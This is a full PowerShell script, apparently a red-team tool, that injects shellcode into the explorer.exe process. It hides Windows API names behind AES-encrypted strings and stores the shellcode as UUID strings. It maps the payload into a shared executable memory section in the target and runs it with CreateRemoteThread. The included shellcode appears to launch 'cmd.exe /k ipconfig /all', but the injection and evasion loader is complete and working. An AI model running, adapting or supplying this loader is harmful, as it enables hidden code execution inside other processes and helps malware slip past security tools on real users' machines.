Function UUID_Process_Injection_Delegate_Alternate {

    function Invoke-FunctionLookup {
        Param (
            [Parameter(Position = 0, Mandatory = $true)] 
            [string] $moduleName,

            [Parameter(Position = 1, Mandatory = $true)] 
            [string] $functionName
        )

        $systemType = ([AppDomain]::CurrentDomain.GetAssemblies() | 
            Where-Object { $_.GlobalAssemblyCache -and $_.Location.Split('\\')[-1] -eq $dsystem_dll }
        ).GetType($dMicrosoft_Win32_UnsafeNativeMethods)

        $getProcAddressMethod = $systemType.GetMethods() | 
        Where-Object { $_.Name -eq $dGetProcAddress }

        $moduleHandle = $systemType.GetMethod($dGetModuleHandle).Invoke($null, @($moduleName))

        return $getProcAddressMethod[0].Invoke($null, @($moduleHandle, $functionName))
    }

    function Invoke-GetDelegate {
        Param (
            [Parameter(Position = 0, Mandatory = $true)] 
            [Type[]] $parameterTypes,

            [Parameter(Position = 1, Mandatory = $false)] 
            [Type] $returnType = [Void]
        )

        $assemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly(
            (New-Object System.Reflection.AssemblyName($dReflectedDelegate)),
            [System.Reflection.Emit.AssemblyBuilderAccess]::Run
        )

        $moduleBuilder = $assemblyBuilder.DefineDynamicModule($dInMemoryModule, $false)

        $typeBuilder = $moduleBuilder.DefineType(
            'MyDelegateType', 
            [System.Reflection.TypeAttributes]::Class -bor 
            [System.Reflection.TypeAttributes]::Public -bor 
            [System.Reflection.TypeAttributes]::Sealed -bor 
            [System.Reflection.TypeAttributes]::AnsiClass -bor 
            [System.Reflection.TypeAttributes]::AutoClass, 
            [System.MulticastDelegate]
        )

        $constructorBuilder = $typeBuilder.DefineConstructor(
            [System.Reflection.MethodAttributes]::RTSpecialName -bor 
            [System.Reflection.MethodAttributes]::HideBySig -bor 
            [System.Reflection.MethodAttributes]::Public,
            [System.Reflection.CallingConventions]::Standard,
            $parameterTypes
        )

        $constructorBuilder.SetImplementationFlags(
            [System.Reflection.MethodImplAttributes]::Runtime -bor 
            [System.Reflection.MethodImplAttributes]::Managed
        )

        $methodBuilder = $typeBuilder.DefineMethod(
            'Invoke',
            [System.Reflection.MethodAttributes]::Public -bor 
            [System.Reflection.MethodAttributes]::HideBySig -bor 
            [System.Reflection.MethodAttributes]::NewSlot -bor 
            [System.Reflection.MethodAttributes]::Virtual,
            $returnType,
            $parameterTypes
        )

        $methodBuilder.SetImplementationFlags(
            [System.Reflection.MethodImplAttributes]::Runtime -bor 
            [System.Reflection.MethodImplAttributes]::Managed
        )

        return $typeBuilder.CreateType()
    }


    function Invoke-DecryptAES {
        param (
            [byte[]]$Data,
            [string]$KeyBase64,
            [string]$IVBase64,
            [switch]$Bytes
        )

        $Key = [System.Convert]::FromBase64String($KeyBase64)
        $IV = [System.Convert]::FromBase64String($IVBase64)

        $AES = [Security.Cryptography.SymmetricAlgorithm]::Create('AES')
        $AES.Key = $Key
        $AES.IV = $IV

        $decryptor = $AES.CreateDecryptor($AES.Key, $AES.IV)
        $memoryStream = New-Object -TypeName IO.MemoryStream -ArgumentList (, $Data)
        $cryptoStream = New-Object -TypeName Security.Cryptography.CryptoStream -ArgumentList @($memoryStream, $decryptor, 'Read')

        $decryptedBytes = New-Object -TypeName Byte[] -ArgumentList $Data.Length
        $decryptedByteCount = $cryptoStream.Read($decryptedBytes, 0, $decryptedBytes.Length)
    
        $cryptoStream.Close()
        $memoryStream.Close()

        if ($Bytes) {
            return $decryptedBytes[0..($decryptedByteCount - 1)]
        }
        else {
            $decryptedString = [System.Text.Encoding]::UTF8.GetString($decryptedBytes[0..($decryptedByteCount - 1)])

            if ($decryptedString -like "*_END_*") {
                $decryptedString = $decryptedString -replace "_END_$", ""
            }

            return $decryptedString
        }
    }

    # Start: Invoke-EncryptAES -InputStrings "system.dll, GetProcAddress, GetModuleHandle, Microsoft.Win32.UnsafeNativeMethods, Kernel32.dll, ReflectedDelegate, InMemoryModule, ntdll.dll, OpenProcess, CreateRemoteThread, NtClose, NtCreateSection, NtMapViewOfSection, NtUnmapViewOfSection"
    [string] $GlobalKey = 'nYdoX+34keW+wR01jLzMTaEEdWltW5n5sBaFBf30Mmw='
    [string] $GlobalIV = 'DObSuMGrEEHeZMmU5cYoXA=='

    [Byte[]] $dsystem_dll_Bytes = + 0x80, 0xF0, 0xA9, 0x58, 0xE5, 0x98, 0xF4, 0xF2, 0x3E, 0x4C, 0x04, 0xAE, 0x08, 0x78, 0x40, 0x03
    [string] $dsystem_dll = Invoke-DecryptAES -Data $dsystem_dll_Bytes -KeyBase64 $GlobalKey -IVBase64 $GlobalIV

    [Byte[]] $dGetProcAddress_Bytes = + 0x07, 0x5A, 0xAF, 0xFE, 0xBC, 0x05, 0x5F, 0x7F, 0xCE, 0x7D, 0x02, 0x42, 0xEC, 0x2C, 0x79, 0x5A
    [string] $dGetProcAddress = Invoke-DecryptAES -Data $dGetProcAddress_Bytes -KeyBase64 $GlobalKey -IVBase64 $GlobalIV

    [Byte[]] $dGetModuleHandle_Bytes = + 0x8B, 0x95, 0xF5, 0x16, 0x78, 0xA9, 0x0C, 0x0C, 0xBE, 0xF8, 0xF7, 0xCD, 0x79, 0x9B, 0x62, 0xBB
    [string] $dGetModuleHandle = Invoke-DecryptAES -Data $dGetModuleHandle_Bytes -KeyBase64 $GlobalKey -IVBase64 $GlobalIV

    [Byte[]] $dMicrosoft_Win32_UnsafeNativeMethods_Bytes = + 0xA9, 0x7D, 0x22, 0x3D, 0x8E, 0x82, 0x01, 0x41, 0x97, 0x8B, 0xBE, 0x4D, 0x71, 0x68, 0x17, 0x4B, 0xA5, 0x4B, 0x49, 0x65, 0x8F, 0xDD, 0x79, 0xB2, 0xBA, 0x5C, 0x5E, 0xE0, 0xE1, 0x31, 0x69, 0xD1, 0xA0, 0x85, 0x60, 0xCD, 0x9D, 0xB5, 0x25, 0xC4, 0xFE, 0x98, 0xA6, 0x7C, 0x19, 0x2B, 0xFC, 0xEA
    [string] $dMicrosoft_Win32_UnsafeNativeMethods = Invoke-DecryptAES -Data $dMicrosoft_Win32_UnsafeNativeMethods_Bytes -KeyBase64 $GlobalKey -IVBase64 $GlobalIV

    [Byte[]] $dKernel32_dll_Bytes = + 0x45, 0xB4, 0x51, 0xE4, 0x28, 0x32, 0x7A, 0x7D, 0x2F, 0x75, 0xA9, 0x2C, 0xE4, 0x43, 0x5A, 0x54
    [string] $dKernel32_dll = Invoke-DecryptAES -Data $dKernel32_dll_Bytes -KeyBase64 $GlobalKey -IVBase64 $GlobalIV

    [Byte[]] $dReflectedDelegate_Bytes = + 0xC2, 0x40, 0x76, 0x94, 0x8A, 0xED, 0xB3, 0xF1, 0x97, 0x15, 0x6D, 0x5E, 0xCE, 0xA5, 0xF2, 0xD9, 0x2D, 0xDC, 0xDD, 0x60, 0x5C, 0x87, 0xBD, 0xA0, 0x5A, 0x53, 0x8E, 0xD0, 0xB8, 0x63, 0x74, 0xCF
    [string] $dReflectedDelegate = Invoke-DecryptAES -Data $dReflectedDelegate_Bytes -KeyBase64 $GlobalKey -IVBase64 $GlobalIV

    [Byte[]] $dInMemoryModule_Bytes = + 0x69, 0xC3, 0x9F, 0xB2, 0x71, 0xA9, 0x03, 0x20, 0xCB, 0x5B, 0xE8, 0x2E, 0x7D, 0x57, 0x33, 0x38
    [string] $dInMemoryModule = Invoke-DecryptAES -Data $dInMemoryModule_Bytes -KeyBase64 $GlobalKey -IVBase64 $GlobalIV

    [Byte[]] $dntdll_dll_Bytes = + 0x53, 0x0F, 0xA3, 0x7D, 0xE3, 0xD9, 0x3D, 0x5B, 0x6B, 0xDC, 0xFE, 0xDE, 0xA9, 0x13, 0xA2, 0x71
    [string] $dntdll_dll = Invoke-DecryptAES -Data $dntdll_dll_Bytes -KeyBase64 $GlobalKey -IVBase64 $GlobalIV

    [Byte[]] $dOpenProcess_Bytes = + 0x71, 0x6F, 0xAC, 0x3F, 0x26, 0xED, 0x4B, 0x76, 0x06, 0xF0, 0x86, 0x89, 0x2D, 0xDE, 0x6B, 0x35
    [string] $dOpenProcess = Invoke-DecryptAES -Data $dOpenProcess_Bytes -KeyBase64 $GlobalKey -IVBase64 $GlobalIV

    [Byte[]] $dCreateRemoteThread_Bytes = + 0x98, 0x92, 0xCF, 0x5C, 0x12, 0x53, 0x99, 0xC6, 0x01, 0x94, 0x3D, 0x03, 0x85, 0x59, 0xBB, 0xF6, 0xE3, 0x34, 0x26, 0xE0, 0xB4, 0x3E, 0x6D, 0x61, 0x7E, 0xFD, 0x6F, 0x19, 0x12, 0xF6, 0x53, 0x57
    [string] $dCreateRemoteThread = Invoke-DecryptAES -Data $dCreateRemoteThread_Bytes -KeyBase64 $GlobalKey -IVBase64 $GlobalIV

    [Byte[]] $dNtClose_Bytes = + 0x80, 0x13, 0xAB, 0x61, 0x62, 0x29, 0xB1, 0xFB, 0x78, 0x8C, 0x25, 0x02, 0xDE, 0xC2, 0x0B, 0x16
    [string] $dNtClose = Invoke-DecryptAES -Data $dNtClose_Bytes -KeyBase64 $GlobalKey -IVBase64 $GlobalIV

    [Byte[]] $dNtCreateSection_Bytes = + 0x92, 0xE0, 0x6C, 0x01, 0xEB, 0xC9, 0x86, 0xD3, 0x45, 0x6B, 0x15, 0x1B, 0x37, 0x17, 0x5B, 0xB5
    [string] $dNtCreateSection = Invoke-DecryptAES -Data $dNtCreateSection_Bytes -KeyBase64 $GlobalKey -IVBase64 $GlobalIV

    [Byte[]] $dNtMapViewOfSection_Bytes = + 0x00, 0xFD, 0x74, 0x5D, 0x28, 0x7D, 0xB0, 0xC7, 0xE2, 0xA0, 0x62, 0xFD, 0x5A, 0xFF, 0x81, 0x48, 0xE6, 0x2D, 0x0D, 0x37, 0x88, 0x4A, 0xA9, 0x8A, 0xE6, 0x2C, 0x06, 0x26, 0x82, 0xBF, 0xC4, 0xB7
    [string] $dNtMapViewOfSection = Invoke-DecryptAES -Data $dNtMapViewOfSection_Bytes -KeyBase64 $GlobalKey -IVBase64 $GlobalIV

    [Byte[]] $dNtUnmapViewOfSection_Bytes = + 0x57, 0x10, 0xE0, 0x3E, 0x25, 0xF7, 0x47, 0x27, 0x18, 0x9A, 0x3A, 0xEA, 0xDF, 0x0E, 0x65, 0x1E, 0x2D, 0xF2, 0xE8, 0x2B, 0x59, 0x0B, 0x63, 0x9F, 0x1D, 0xB9, 0x2D, 0xA1, 0xD2, 0x5B, 0x1A, 0x1A
    [string] $dNtUnmapViewOfSection = Invoke-DecryptAES -Data $dNtUnmapViewOfSection_Bytes -KeyBase64 $GlobalKey -IVBase64 $GlobalIV
    # End: Output from Invoke-EncryptAES
    
    $fnOpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookup -moduleName $dKernel32_dll -functionName $dOpenProcess), (Invoke-GetDelegate @([UInt32], [bool], [UInt32]) ([IntPtr])))
    $fnCreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookup -moduleName $dKernel32_dll -functionName $dCreateRemoteThread), (Invoke-GetDelegate @([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])))
    $fnNtCreateSection = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookup -moduleName $dntdll_dll -functionName $dNtCreateSection), (Invoke-GetDelegate @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [UInt64].MakeByRefType(), [UInt32], [UInt32], [IntPtr]) ([UInt32])))
    $fnNtMapViewOfSection = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookup -moduleName $dntdll_dll -functionName $dNtMapViewOfSection), (Invoke-GetDelegate @([IntPtr], [IntPtr], [IntPtr].MakeByRefType(), [IntPtr], [IntPtr], [UInt64].MakeByRefType(), [UInt64].MakeByRefType(), [UInt32], [UInt32], [UInt32]) ([Int])))
    $fnNtUnmapViewOfSection = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookup -moduleName $dntdll_dll -functionName $dNtUnmapViewOfSection), (Invoke-GetDelegate @([IntPtr], [IntPtr]) ([Int])))
    $ntClose = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookup -moduleName $dntdll_dll -functionName $dNtClose), (Invoke-GetDelegate @([IntPtr]) ([Int])))

    
    [Array] $UUIDs = @(
        #
        # Start: Output from Convert-UUID.ps1
        "e48348fc-e8f0-00c0-0000-415141505251",
        "d2314856-4865-528b-6048-8b5218488b52",
        "728b4820-4850-b70f-4a4a-4d31c94831c0",
        "7c613cac-2c02-4120-c1c9-0d4101c1e2ed",
        "48514152-528b-8b20-423c-4801d08b8088",
        "48000000-c085-6774-4801-d0508b481844",
        "4920408b-d001-56e3-48ff-c9418b348848",
        "314dd601-48c9-c031-ac41-c1c90d4101c1",
        "f175e038-034c-244c-0845-39d175d85844",
        "4924408b-d001-4166-8b0c-48448b401c49",
        "8b41d001-8804-0148-d041-5841585e595a",
        "59415841-5a41-8348-ec20-4152ffe05841",
        "8b485a59-e912-ff57-ffff-5d48ba010000",
        "00000000-4800-8d8d-0101-000041ba318b",
        "d5ff876f-f0bb-a2b5-5641-baa695bd9dff",
        "c48348d5-3c28-7c06-0a80-fbe07505bb47",
        "6a6f7213-5900-8941-daff-d5636d642e65",
        "2f206578-206b-7069-636f-6e666967202f",
        "006c6c61-9090-9090-9090-909090909090"
        # End Output from Convert-UUID.ps1
        #
    )

    $Warhead = New-Object byte[] ($uuids.Length * 16)
    for ($i = 0; $i -lt $uuids.Length; $i++) {
        $guid = [Guid]::Parse($uuids[$i])
        $guidBytes = $guid.ToByteArray()
        [Buffer]::BlockCopy($guidBytes, 0, $Warhead, $i * 16, 16)
    }
        
    $size = $Warhead.Length
    $warheadSize = [long]$size

    [IntPtr] $sectionHandle = [IntPtr]::Zero    
    $createSectionStatus = $fnNtCreateSection.Invoke([ref] $sectionHandle, 0xe, [IntPtr]::Zero, [ref] $warheadSize, 0x40, 0x08000000, [IntPtr]::Zero)

    [IntPtr] $localSectionAddr = [IntPtr]::Zero
    $localSectionOffset = 0
    $localMapViewStatus = $fnNtMapViewOfSection.Invoke($sectionHandle, -1, [ref] $localSectionAddr, [IntPtr]::Zero, [IntPtr]::Zero, [ref] $localSectionOffset, [ref] $warheadSize, 0x2, 0, 0x04)

    [System.Runtime.InteropServices.Marshal]::Copy($Warhead, 0, $localSectionAddr, $size)

    $process = (Get-Process -Name "explorer")[0]
    $processHandle = $fnOpenProcess.Invoke(0x001F0FFF, $false, [uint32]$process.Id)

    [IntPtr] $remoteSectionAddr = [IntPtr]::Zero
    $remoteMapViewStatus = $fnNtMapViewOfSection.Invoke($sectionHandle, $processHandle, [ref] $remoteSectionAddr, [IntPtr]::Zero, [IntPtr]::Zero, [ref] $localSectionOffset, [ref] $warheadSize, 0x2, 0, 0x20)

    $fnNtUnmapViewOfSection.Invoke(-1, $localSectionAddr) > $null
    $ntClose.Invoke($sectionHandle) > $null
    $fnCreateRemoteThread.Invoke($processHandle, [IntPtr]::Zero, 0, $remoteSectionAddr, [IntPtr]::Zero, 0, [IntPtr]::Zero) > $null

} UUID_Process_Injection_Delegate_Alternate
